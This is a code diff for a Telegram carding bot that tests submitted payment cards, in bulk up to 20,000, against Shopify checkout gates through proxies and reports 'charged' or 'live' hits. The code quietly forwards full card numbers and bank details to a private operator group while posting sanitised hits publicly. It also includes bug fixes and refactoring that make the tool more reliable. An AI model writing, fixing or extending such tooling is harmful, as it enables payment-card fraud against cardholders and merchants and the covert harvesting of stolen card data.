 def _hit_text(card: str, resp: str, bin_data: dict, price: str, currency: str,
               elapsed: float, user, plan: str, verdict: str) -> str:
-    """Full-detail message sent as a DM back to the user who hit the card."""
-    bd    = bin_data or {}
-    flag  = bd.get("country_emoji","")
-    cnt   = bd.get("country","N/A")
-    bi    = escape(f"{str(bd.get('scheme','N/A')).upper()} - {bd.get('bank','N/A')} - {(flag+' '+cnt).strip()}")
-    ps    = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
-    sl    = (f'<b><a href="{BOT_CHANNEL}">[❆]</a> Charged {_rand_charged()}</b>'
-             if verdict == "CHARGED" else
-             f'<b><a href="{BOT_CHANNEL}">[❆]</a> Live {_rand_live()}</b>')
-    gl    = f'<b>Gate ➳ Shopify{ps}</b>' if verdict == "CHARGED" else '<b>Gate ➳ Shopify 0-20$</b>'
+    bd   = bin_data or {}
+    flag = bd.get("country_emoji", "")
+    cnt  = bd.get("country", "N/A")
+    bi   = escape(f"{str(bd.get('scheme','N/A')).upper()} - {bd.get('bank','N/A')} - {(flag+' '+cnt).strip()}")
+    ps   = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
+    sl   = (f'<b><a href="{BOT_CHANNEL}">[❆]</a> Charged {_rand_charged()}</b>'
+            if verdict == "CHARGED" else
+            f'<b><a href="{BOT_CHANNEL}">[❆]</a> Live {_rand_live()}</b>')
+    gl   = f'<b>Gate ➳ Shopify{ps}</b>' if verdict == "CHARGED" else '<b>Gate ➳ Shopify 0-20$</b>'
     return (
         f'{sl}\n\n'
         f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
         f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
         f'{gl}\n'
         f'<b>──────────</b>\n'
-        f'<b>Resp ➳ {escape(resp)}</b>\n'
+        f'<b>Resp ➳ {escape(_clean_resp(resp))}</b>\n'
         f'<b>Bin  ➳ <code>{bi}</code></b>\n'
         f'<b>──────────</b>\n'
         f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {_fmt_time(elapsed)}</b>\n'
@@ -740,53 +757,22 @@ def _hit_text(card: str, resp: str, bin_data: dict, price: str, currency: str,
         f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
     )
 
-def _private_log_text(resp: str, price: str, currency: str,
-                      user, plan: str, verdict: str) -> str:
-    """Full-detail text for the PRIVATE hit-log group (card shown, bank shown)."""
-    ps    = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
-    eid   = _rand_charged() if verdict == "CHARGED" else _rand_live()
-    label = "Charged" if verdict == "CHARGED" else "Live"
-    return (
-        f'<b>HIT ➛ {label} {eid}</b>\n'
-        f'<b>Gate ➛ Shopify Payments{ps}</b>\n'
-        f'<b>{_te("5839116473951328489","✅")} <code>{escape(resp)}</code></b>\n'
-        f'<b>User ➛ {_user_link(user)} {_te(_plan_eid(plan),"⭐")}</b>'
-    )
-
 def _share_group_text(resp: str, price: str, currency: str,
                       user, plan: str, verdict: str) -> str:
-    """
-    Clean public-facing message posted to CHARGED_SHARE_GROUP.
-    ✦ NO card number
-    ✦ NO bank name / BIN details
-    ✦ Shows only verdict, gate, response, and the user's first name.
-
-    Renders as:
-        HIT ➛ CHARGED 💎
-        Gate ➛ Shopify Payments
-        ✅ ORDER_PAID
-        User ➛ William ⭐
-    """
-    ps    = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
-    eid   = _rand_charged() if verdict == "CHARGED" else _rand_live()
-    label = "CHARGED" if verdict == "CHARGED" else "LIVE"
-    gate  = f"Shopify Payments{ps}"
-    # Show first name only — never username or user ID for privacy
-    fname = escape(user.first_name or "User") if user else "User"
+    ps     = f" | {escape(price)} {escape(currency)}" if price and price != "0.00" else ""
+    eid    = _rand_charged() if verdict == "CHARGED" else _rand_live()
+    label  = "CHARGED" if verdict == "CHARGED" else "LIVE"
+    gate   = f"Shopify Payments{ps}"
+    fname  = escape(user.first_name or "User") if user else "User"
     plan_e = _te(_plan_eid(plan), "⭐")
     return (
         f'<b>HIT ➛ {label} {eid}</b>\n'
         f'<b>Gate ➛ {gate}</b>\n'
-        f'<b>{_te("5839116473951328489","✅")} {escape(resp)}</b>\n'
+        f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} {escape(_clean_resp(resp))}</b>\n'
         f'<b>User ➛ {fname} {plan_e}</b>'
     )
 
 def _share_group_kb() -> RawMarkup:
-    """
-    Buttons on every public charged/live message posted to the logs group.
-    Row 1: ⚡ Batmanchk — tapping runs /buy automatically via deep-link.
-    Row 2: 📢 Channel  |  💬 Group
-    """
     return RawMarkup([
         [_btn(f"⚡ {BOT_DISPLAY} — /buy", url=BOT_DEEP_BUY,
               style="primary", icon=BTN_CHARGED_EMOJI_ID)],
@@ -797,16 +783,9 @@ def _share_group_kb() -> RawMarkup:
 async def _send_hit_log(bot, resp: str, price: str, currency: str,
                         user, plan: str, verdict: str = "CHARGED",
                         card: str = "", bin_data: dict = None):
-    """
-    Fire charged/live notifications to two destinations simultaneously.
-
-    HIT_LOG_GROUP_ID (-1004361062205)  →  clean public UI + ⚡Batmanchk + channel/group buttons
-    SECRET_GROUP_ID  (-1004499920555)  →  full card + BIN details, no button (silent/private)
-    """
     await _rl_hit.wait()
     bin_data = bin_data or {}
 
-    # ── Logs group: clean public UI — no card number, no BIN ──────────
     if HIT_LOG_GROUP_ID:
         log_text = _share_group_text(resp, price, currency, user, plan, verdict)
         try:
@@ -820,7 +799,6 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
         except Exception as e:
             logging.error(f"[SH] hit-log → {HIT_LOG_GROUP_ID}: {e}")
 
-    # ── Secret channel: full card + BIN details (silent, no button) ───
     if SECRET_GROUP_ID and card:
         secret_text = _hit_text(card, resp, bin_data, price, currency, 0, user, plan, verdict)
         try:
@@ -834,7 +812,7 @@ async def _send_hit_log(bot, resp: str, price: str, currency: str,
             logging.error(f"[SH] secret-group → {SECRET_GROUP_ID}: {e}")
 
 async def _send_user_dm(bot, user, card, resp, bin_data, price, currency,
-                         elapsed, plan, verdict, reply_to=None):
+                        elapsed, plan, verdict, reply_to=None):
     await _rl_dm.wait()
     text = _hit_text(card, resp, bin_data, price, currency, elapsed, user, plan, verdict)
     kb   = RawMarkup([[_btn(
@@ -860,18 +838,18 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
         await update.message.reply_text(_maintenance_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
     if not context.bot_data.get("sh_on", True):
         await update.message.reply_text(_gate_off_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
 
     nj = await _check_force_sub(user.id, context)
     if nj:
         rows = [[_btn(f"➺ Join @{n}", url=l)] for n, l in nj]
         rows.append([_btn("✅  I Joined — Verify", cb="check_sub", style="primary")])
         await update.message.reply_text(_join_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True,
-                                         reply_markup=RawMarkup(rows)); return
+                                        disable_web_page_preview=True,
+                                        reply_markup=RawMarkup(rows)); return
 
     card = None
     if context.args:
@@ -884,7 +862,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not card or card.count("|") < 3:
         await update.message.reply_text(_usage_sh_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
 
     ud      = _get_ud(user.id, context)
     premium = _is_premium(ud, user.id)
@@ -915,7 +893,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     bin6    = card.split("|")[0][:6]
 
     spinner_kb = RawMarkup([[_btn("Checking…", url=BOT_CHANNEL, style="secondary",
-                                   icon=PROG_PROGRESS_EMOJI_ID)]])
+                                  icon=PROG_PROGRESS_EMOJI_ID)]])
     try:
         msg = await update.message.reply_text(
             f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
@@ -926,22 +904,20 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text("🛒 Checking…")
 
     try:
-        # Reuse the persistent session — no new TCP handshake
         sess = await _get_sh_session()
-
-        # BIN + gate call in parallel — BIN never blocks the gate
+        # BIN lookup + gate call run in parallel — BIN never blocks the gate
         (verdict, resp_text, api_price, api_currency), bin_data = await asyncio.gather(
             _check_card_with_retry(sess, card, sites, proxies,
                                    max_sites=SH_SITE_RETRIES,
                                    site_timeout=SH_SITE_TIMEOUT),
-            _sh_bin_cached(bin6),   # module-level cache — instant if seen before
+            _sh_bin_cached(bin6),
             return_exceptions=False,
         )
     except asyncio.TimeoutError:
-        verdict, resp_text, api_price, api_currency = "DEAD", "BIN lookup timeout", "0.00", "USD"
+        verdict, resp_text, api_price, api_currency = "DEAD", "Timeout", "0.00", "USD"
         bin_data = {}
     except BaseException as e:
-        verdict, resp_text, api_price, api_currency = "DEAD", str(e)[:80], "0.00", "USD"
+        verdict, resp_text, api_price, api_currency = "DEAD", _clean_resp(str(e)[:80]), "0.00", "USD"
         bin_data = {}
 
     if not isinstance(bin_data, dict):
@@ -956,16 +932,17 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ud["declined_checks"] = ud.get("declined_checks", 0) + 1
     ud["total_checks"] = ud.get("total_checks", 0) + 1
 
-    # ── Show result for ALL verdicts (CHARGED / LIVE / TDS / DEAD) ───────
-    # Response text is already cleaned by _clean_resp — site URL never shows
     text = _build_result(card, resp_text, verdict, bt, api_price, api_currency, elapsed, user, plan)
     kb   = _kb_verdict(verdict)
     try:
         await msg.edit_text(text, parse_mode="HTML", reply_markup=kb,
-                             disable_web_page_preview=True)
+                            disable_web_page_preview=True)
     except Exception:
-        await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
-                                         disable_web_page_preview=True)
+        try:
+            await update.message.reply_text(text, parse_mode="HTML", reply_markup=kb,
+                                            disable_web_page_preview=True)
+        except Exception as e2:
+            logging.error(f"[SH] result send failed: {e2}")
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
         asyncio.create_task(asyncio.gather(
@@ -1048,7 +1025,7 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
                  sess.get("dead_cards", []))
         label = "All"
     name  = (user_obj.first_name or "User") if user_obj else "User"
-    lines = [f"Gate ➳ Shopify Mass", f"Result ➳ {label}", f"Total ➳ {len(cards)}", "━"*14]
+    lines = [f"Gate ➳ Shopify Mass", f"Result ➳ {label}", f"Total ➳ {len(cards)}", "━" * 14]
     for cd in cards:
         bi      = cd.get("bin_info", {})
         flag    = bi.get("country_emoji", "")
@@ -1066,7 +1043,7 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
             f"Country ➳ {(flag+' '+country).strip()}",
             f"User    ➳ {name} ({plan})",
             f"Pro     ➳ {BOT_DISPLAY}",
-            "━"*14,
+            "━" * 14,
         ]
     buf = BytesIO("\n".join(lines).encode())
     buf.seek(0)
@@ -1076,7 +1053,7 @@ def _generate_result_file(sess: dict, rtype: str, user_obj, plan: str):
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PER-CARD MASS WORKER  (hot path — stay lean)
+# PER-CARD MASS WORKER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _mass_worker(
     sid: str,
@@ -1114,7 +1091,8 @@ async def _mass_worker(
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            verdict, resp, price, currency = "DEAD", str(e)[:80], "0.00", "USD"
+            # BUG FIX: clean exception string before storing/showing
+            verdict, resp, price, currency = "DEAD", _clean_resp(str(e)[:80]), "0.00", "USD"
 
         elapsed = time.time() - t0
         sess    = MSH_SESSIONS.get(sid)
@@ -1135,13 +1113,12 @@ async def _mass_worker(
         if verdict == "CHARGED":
             sess["charged"] += 1
             sess.setdefault("charged_cards", []).append(card_data)
-            # Notify: logs group (clean UI) + secret channel (full card) + DM user
             asyncio.create_task(asyncio.gather(
                 _send_hit_log(bot, resp, price, currency, user_obj, plan, "CHARGED",
                               card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
-                               elapsed, plan, "CHARGED",
-                               reply_to=sess.get("user_msg_id")),
+                              elapsed, plan, "CHARGED",
+                              reply_to=sess.get("user_msg_id")),
                 return_exceptions=True,
             ))
         elif verdict in ("LIVE", "TDS"):
@@ -1151,8 +1128,8 @@ async def _mass_worker(
                 _send_hit_log(bot, resp, price, currency, user_obj, plan, "LIVE",
                               card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
-                               elapsed, plan, "LIVE",
-                               reply_to=sess.get("user_msg_id")),
+                              elapsed, plan, "LIVE",
+                              reply_to=sess.get("user_msg_id")),
                 return_exceptions=True,
             ))
         else:
@@ -1244,10 +1221,10 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
         await update.message.reply_text(_maintenance_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
     if not context.bot_data.get("msh_on", True):
         await update.message.reply_text(_gate_off_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
 
     ud      = _get_ud(user.id, context)
     premium = _is_premium(ud, user.id)
@@ -1267,7 +1244,6 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML", disable_web_page_preview=True,
             ); return
 
-    # ── Collect raw text ─────────────────────────────────
     raw = ""
     if context.args:
         raw += " ".join(context.args) + " "
@@ -1292,7 +1268,7 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not raw.strip():
         await update.message.reply_text(_usage_msh_msg(), parse_mode="HTML",
-                                         disable_web_page_preview=True); return
+                                        disable_web_page_preview=True); return
 
     extracted = extract_cards(raw)
     if not extracted:
@@ -1301,7 +1277,6 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML"
         ); return
 
-    # Luhn + expiry filter
     valid: list[tuple[str, str]] = []
     for cs in extracted:
         if len(valid) >= 20000: break
@@ -1340,49 +1315,60 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     MSH_SESSIONS[sid] = {
-        "status":       "CHECKING",
-        "chat_id":      update.message.chat_id,
-        "user_id":      user.id,
-        "msg_id":       prog_msg.message_id,
-        "user_msg_id":  update.message.message_id,
-        "total":        total,
-        "checked":      0,
-        "charged":      0,
-        "live":         0,
-        "dead":         0,
-        "_batch_dead":  0,
-        "start_time":   time.time(),
-        "tasks":        [],
-        "last_text":    "",
-        "last_update":  0,
+        "status":        "CHECKING",
+        "chat_id":       update.message.chat_id,
+        "user_id":       user.id,
+        "msg_id":        prog_msg.message_id,
+        "user_msg_id":   update.message.message_id,
+        "total":         total,
+        "checked":       0,
+        "charged":       0,
+        "live":          0,
+        "dead":          0,
+        "_batch_dead":   0,
+        "start_time":    time.time(),
+        "tasks":         [],
+        "last_text":     "",
+        "last_update":   0,
         "charged_cards": [],
         "live_cards":    [],
         "dead_cards":    [],
-        "user_obj":     user,
-        "plan":         plan,
+        "user_obj":      user,
+        "plan":          plan,
     }
     logging.info(f"🚀 [MSH] {sid} — {total} cards — conc {MAX_CONCURRENT} — user {user.id}")
     asyncio.create_task(_run_mass_batch(context.bot, sid, valid, user, plan, sites, proxies))
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK HANDLERS  — Stop + Result download
+# CALLBACK HANDLERS — Stop + Result download
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    BUG FIX: removed the pre-emptive `await query.answer()` at the top.
+    Telegram only allows ONE answer() per callback query. The old code called
+    answer() immediately (line 1 of the handler), then tried to call it again
+    for every alert/error — those all threw BadRequest and the user saw nothing.
+    Now each branch answers exactly once with the right message.
+    """
     query = update.callback_query
-    await query.answer()
-    # mshr_{sid}_{type}
+    # mshr_{sid}_{type}  — split at most twice so rtype can never be empty
     parts = query.data.split("_", 2)
     if len(parts) < 3:
-        await query.answer("⚠️ Invalid callback", show_alert=True); return
+        await query.answer("⚠️ Invalid button", show_alert=True)
+        return
+
     sid, rtype = parts[1], parts[2]
     sess = MSH_SESSIONS.get(sid)
     if not sess:
-        await query.answer("⚠️ Session expired", show_alert=True); return
+        await query.answer("⚠️ Session expired — start a new /msh", show_alert=True)
+        return
     if query.from_user.id != sess.get("user_id"):
-        await query.answer("❌ No permission", show_alert=True); return
+        await query.answer("❌ This is not your session", show_alert=True)
+        return
     if _is_locked(sid):
-        await query.answer(f"⏳ Wait {_lock_rem(sid)}s", show_alert=True); return
+        await query.answer(f"⏳ Please wait {_lock_rem(sid)}s", show_alert=True)
+        return
 
     if rtype == "charged":
         count = len(sess.get("charged_cards", []))
@@ -1393,12 +1379,16 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:  # "all"
         count = (len(sess.get("charged_cards", [])) + len(sess.get("live_cards", [])) +
                  len(sess.get("dead_cards", [])))
-    if count == 0:
-        await query.answer(f"❌ No {rtype} cards yet", show_alert=True); return
 
-    await query.answer("📦 Generating…")
-    user_obj = sess.get("user_obj")
-    plan     = sess.get("plan", "TRIAL")
+    if count == 0:
+        await query.answer(f"❌ No {rtype} cards yet", show_alert=True)
+        return
+
+    # Acknowledge the tap so Telegram stops showing the loading spinner
+    await query.answer(f"📦 Preparing {rtype} file…")
+
+    user_obj   = sess.get("user_obj")
+    plan       = sess.get("plan", "TRIAL")
     buf, fn, n = _generate_result_file(sess, rtype, user_obj, plan)
     capt = f"Result ➳ {rtype.title()}\nTotal ➳ <b>{n}</b>\nGate ➳ Shopify Mass"
     data = buf.read()
@@ -1416,7 +1406,11 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 caption=capt, parse_mode="HTML",
             )
         except Exception as e:
-            await query.message.reply_text(f"❌ {e}", parse_mode="HTML")
+            logging.error(f"[MSH] send_document failed: {e}")
+            try:
+                await query.message.reply_text(f"❌ Could not send file: {e}", parse_mode="HTML")
+            except Exception:
+                pass
 
 
 async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1429,19 +1423,22 @@ async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("⚠️ Session not found", show_alert=True); return
     if query.from_user.id != sess.get("user_id"):
         await query.answer("❌ No permission", show_alert=True); return
-    # NOTE: Stop button NEVER locks — user must be able to stop immediately
+    # Stop NEVER locks — user must be able to stop at any time
     if sess["status"] != "CHECKING":
         await query.answer("ℹ️ Already stopped", show_alert=True); return
-    # Mark stopped FIRST so all workers see it instantly on next iteration
+
+    # Mark STOPPED first so all workers see it on their next iteration
     sess["status"] = "STOPPED"
-    # Cancel all pending tasks immediately
+
+    # Cancel every pending asyncio task immediately
     cancelled = 0
     for t in sess.get("tasks", []):
         if not t.done():
             t.cancel()
             cancelled += 1
     sess["tasks"] = []
-    await query.answer(f"🛑 Stopped! ({cancelled} tasks cancelled)")
+
+    await query.answer(f"🛑 Stopped! {cancelled} tasks cancelled")
     sess["last_text"] = ""
     asyncio.create_task(_update_progress(context.bot, sid, force=True))
 
@@ -1456,7 +1453,7 @@ def get_msh_handler() -> CommandHandler:
     return CommandHandler("msh", cmd_msh)
 
 def get_msh_callback_handlers() -> list:
-    """Add to main.py BEFORE the global CallbackQueryHandler."""
+    """Register these in main.py BEFORE the global CallbackQueryHandler."""
     return [
         CallbackQueryHandler(cb_msh_result, pattern=rf"^{_CB_RESULT}_"),
         CallbackQueryHandler(cb_msh_stop,   pattern=rf"^{_CB_STOP}_"),
